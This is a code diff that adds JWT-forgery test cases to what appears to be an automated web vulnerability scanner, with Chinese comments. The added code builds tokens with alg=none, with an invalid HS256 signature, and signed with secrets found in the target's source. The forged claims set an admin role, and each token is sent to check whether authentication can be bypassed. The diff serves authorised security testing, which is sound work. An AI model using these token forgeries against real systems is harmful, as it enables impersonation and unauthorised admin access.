@@ -13,6 +13,7 @@
  *  - 响应体经 Host 脱敏后才返回给 Sidecar（写入证据的仍是掩码形式）
  */
 import { createServer } from "node:http";
+import { createHmac } from "node:crypto";
 import { RPC_TO_HOST, VERDICT, CASE_CATEGORY, SEVERITY, shortId } from "../../shared/protocol.mjs";
 import { followRedirects } from "./http-follow.mjs";
 import {
@@ -517,7 +518,8 @@ async function discoverResources(ctx, baseUrl, loggedIn) {
       planCandidates(ctx, "sqli").length > 0 ||
       planCandidates(ctx, "cmdi").length > 0 ||
       planCandidates(ctx, "ssrf").length > 0 ||
-      planCandidates(ctx, "upload").length > 0
+      planCandidates(ctx, "upload").length > 0 ||
+      planCandidates(ctx, "jwt").length > 0
     ) {
       ctx.emit({
         kind: "discovery",
@@ -1015,6 +1017,44 @@ async function waitForCanaryHit(canary, timeoutMs = SSRF_CANARY_WAIT_MS) {
     await new Promise((r) => setTimeout(r, 50));
   }
   return matched();
+}
+
+// —— JWT 用例辅助 ——
+// 伪造令牌只用于本机/授权目标：无签名（alg=none）、无效 HS256 签名、以及源码里明写的密钥签发的 HS256。
+// 判定必须内容级：匿名被拒 + 伪造令牌被接受 + 响应回显攻击者指定的身份。
+
+const JWT_FORGE_TTL_S = 3600;
+
+function b64urlJson(obj) {
+  return Buffer.from(JSON.stringify(obj)).toString("base64url");
+}
+
+function jwtForgeClaims(marker) {
+  const now = Math.floor(Date.now() / 1000);
+  return {
+    sub: marker,
+    username: marker,
+    name: marker,
+    email: `${marker}@gb.local`,
+    role: "admin",
+    iat: now,
+    exp: now + JWT_FORGE_TTL_S,
+  };
+}
+
+function jwtForgeNone(marker) {
+  return `${b64urlJson({ alg: "none", typ: "JWT" })}.${b64urlJson(jwtForgeClaims(marker))}.`;
+}
+
+function jwtForgeGarbage(marker) {
+  const body = `${b64urlJson({ alg: "HS256", typ: "JWT" })}.${b64urlJson(jwtForgeClaims(marker))}`;
+  return `${body}.Z2ItZm9yZ2VkLXNpZ25hdHVyZQ`;
+}
+
+function jwtForgeHs256(marker, secret) {
+  const body = `${b64urlJson({ alg: "HS256", typ: "JWT" })}.${b64urlJson(jwtForgeClaims(marker))}`;
+  const sig = createHmac("sha256", secret).update(body).digest("base64url");
+  return `${body}.${sig}`;
 }
 
 // —— 文件上传用例辅助 ——
@@ -1859,6 +1899,131 @@ export function buildCases(ctx, targets) {
     });
   }
 
+  // —— JWT 伪造令牌用例：alg=none / 无效签名 / 源码密钥签发，接受且回显伪造身份即成立 ——
+  for (const [i, cand] of planCandidates(ctx, "jwt").entries()) {
+    const routePath = candPath(cand);
+    if (!routePath || !cand.jwt) continue;
+    const suffix = i === 0 ? "" : `-${i + 1}`;
+    const method = cand.method ?? "GET";
+    cases.push({
+      id: `attack-jwt-forge${suffix}`,
+      candidateKey: candKey(cand),
+      category: CASE_CATEGORY.ATTACK,
+      unfixable: true,
+      name: `JWT 伪造令牌（${routePath} · ${cand.jwt.label ?? cand.jwt.issue}）`,
+      identity: null,
+      method,
+      path: routePath,
+      routeKey: cand.routeKeys?.[0] ?? null,
+      expect: "受认证端点必须校验 JWT 签名与算法：alg=none、无效签名或非授权密钥签发的令牌都应被拒绝（401/403）",
+      send: async (c, baseUrl) => {
+        const marker = `gbjwt${shortId("f").replace(/[^a-z0-9]/gi, "")}`;
+        const anon = await httpJson(c, { baseUrl, method, path: routePath });
+        const protectedEndpoint = DENIED_STATUS.has(anon.status);
+        const attempts = [];
+        if (!protectedEndpoint) {
+          anon._jwtProof = { marker, baselineStatus: anon.status, protected: false, attempts, hit: false };
+          return { res: anon, path: routePath, method };
+        }
+        const variants = [
+          { alg: "alg=none", token: jwtForgeNone(marker) },
+          { alg: "HS256(签名无效)", token: jwtForgeGarbage(marker) },
+          ...(cand.jwt.secrets ?? []).map((secret) => ({ alg: "HS256(源码密钥)", token: jwtForgeHs256(marker, secret) })),
+        ];
+        let hit = null;
+        let acceptedWithoutEcho = null;
+        let lastRes = anon;
+        for (const v of variants) {
+          let res;
+          try {
+            res = await httpJson(c, {
+              baseUrl,
+              method,
+              path: routePath,
+              extraHeaders: { Authorization: `Bearer ${v.token}` },
+            });
+          } catch (e) {
+            attempts.push({ alg: v.alg, status: 0, error: String(e?.message ?? e).slice(0, 160) });
+            continue;
+          }
+          lastRes = res;
+          const markerEcho = String(res.body ?? "").includes(marker);
+          attempts.push({ alg: v.alg, status: res.status, markerEcho });
+          if (okStatus(res.status) && markerEcho) {
+            hit = { res, alg: v.alg };
+            break;
+          }
+          if (okStatus(res.status) && !acceptedWithoutEcho) acceptedWithoutEcho = { res, alg: v.alg };
+        }
+        const chosen = hit?.res ?? lastRes;
+        chosen._jwtProof = {
+          marker,
+          baselineStatus: anon.status,
+          protected: true,
+          attempts,
+          hit: !!hit,
+          alg: hit?.alg ?? null,
+          acceptedWithoutEcho: acceptedWithoutEcho?.alg ?? null,
+        };
+        return { res: chosen, path: routePath, method };
+      },
+      verify: (res, phase) => {
+        const p = res._jwtProof ?? {};
+        const tried = (p.attempts ?? []).map((a) => `${a.alg}:${a.status || "ERR"}`).join("、");
+        if (!p.protected) {
+          return {
+            verdict: VERDICT.INCONCLUSIVE,
+            actual: `HTTP ${p.baselineStatus}，匿名访问未被拒绝，该端点不经认证，无法构成令牌伪造绕过`,
+          };
+        }
+        if (phase === "pre") {
+          if (p.hit) {
+            return {
+              verdict: VERDICT.VULNERABLE,
+              actual: `HTTP ${res.status}，使用 ${p.alg} 伪造令牌通过校验；响应回显伪造身份 ${p.marker}`,
+            };
+          }
+          if (p.acceptedWithoutEcho) {
+            return {
+              verdict: VERDICT.INCONCLUSIVE,
+              actual: `HTTP 200，${p.acceptedWithoutEcho} 伪造令牌被接受但响应未回显伪造身份，无法证明令牌来源`,
+            };
+          }
+          if (DENIED_STATUS.has(res.status) || (p.attempts ?? []).every((a) => DENIED_STATUS.has(a.status))) {
+            return {
+              verdict: VERDICT.BLOCKED,
+              actual: `HTTP ${res.status}，伪造令牌被拒绝（尝试：${tried}）`,
+            };
+          }
+          return {
+            verdict: VERDICT.INCONCLUSIVE,
+            actual: `HTTP ${res.status}，未取得可判定的令牌接受证据（尝试：${tried}）`,
+          };
+        }
+        if (p.hit) {
+          return { verdict: VERDICT.REGRESSED, actual: `HTTP ${res.status}，修复后 ${p.alg} 伪造令牌仍被接受` };
+        }
+        if (DENIED_STATUS.has(res.status)) {
+          return { verdict: VERDICT.BLOCKED, actual: `HTTP ${res.status}，伪造令牌被拒绝（尝试：${tried}）` };
+        }
+        return {
+          verdict: VERDICT.INCONCLUSIVE,
+          actual: `HTTP ${res.status}，修复后未取得可判定证据（尝试：${tried}）`,
+        };
+      },
+      crossProof: (res) =>
+        res._jwtProof?.hit
+          ? {
+              note: `使用 ${res._jwtProof.alg} 伪造令牌通过认证，响应回显攻击者指定的身份 ${res._jwtProof.marker}：签名校验被绕过`,
+            }
+          : null,
+      impact: (res) =>
+        res._jwtProof?.hit
+          ? "可伪造任意用户/管理员身份通过认证，越权访问管理接口或冒用他人身份"
+          : null,
+    });
+  }
+
   // —— SQL 注入用例：随机基线 vs 布尔/报错载荷（无修复模板，仅取证）——
   for (const [i, cand] of planCandidates(ctx, "sqli").entries()) {
     const injection = cand.sqli;
@@ -2309,7 +2474,7 @@ export async function runPhase(ctx, { phase, baseUrl }) {
   // 个别实现会同步阻塞事件循环。排在最后，避免一条挂起的用例拖掉整轮注入取证。
   const isSlow = (c) =>
     c.category === CASE_CATEGORY.ATTACK &&
-    (c.id.startsWith("attack-path-traversal") || c.id.startsWith("attack-ssrf") || c.id.startsWith("attack-upload"));
+    (c.id.startsWith("attack-path-traversal") || c.id.startsWith("attack-ssrf") || c.id.startsWith("attack-upload") || c.id.startsWith("attack-jwt-forge"));
   const orderedCases = [...allCases.filter((c) => !isSlow(c)), ...allCases.filter(isSlow)];
   // 外部攻击面扫描：发常见管理路径/敏感文件，记录暴露面（pre 阶段才跑）
   if (phase === "pre") {
@@ -2342,7 +2507,7 @@ export async function runPhase(ctx, { phase, baseUrl }) {
     ctx.emit({
       kind: "phase",
       severity: SEVERITY.INFO,
-      message: `修复后验收跳过 ${skippedUnfixable.length} 条无自动修复模板的攻击用例（注入/穿越/SSRF/上传类仅取证）`,
+      message: `修复后验收跳过 ${skippedUnfixable.length} 条无自动修复模板的攻击用例（注入/穿越/SSRF/上传/JWT 类仅取证）`,
       phase,
       data: { skipped: skippedUnfixable.map((c) => c.id) },
     });
@@ -2364,6 +2529,7 @@ export async function runPhase(ctx, { phase, baseUrl }) {
     { slot: "cmdiCandidate", prefix: "attack-command-injection", count: planCandidates(ctx, "cmdi").length },
     { slot: "ssrfCandidate", prefix: "attack-ssrf", count: planCandidates(ctx, "ssrf").length },
     { slot: "uploadCandidate", prefix: "attack-upload", count: planCandidates(ctx, "upload").length },
+    { slot: "jwtCandidate", prefix: "attack-jwt-forge", count: planCandidates(ctx, "jwt").length },
   ].filter((s) => s.count > 0);
   const skipped = plannedSlots.filter(
     (s) => !allCases.some((c) => c.id === s.prefix || c.id.startsWith(`${s.prefix}-`))
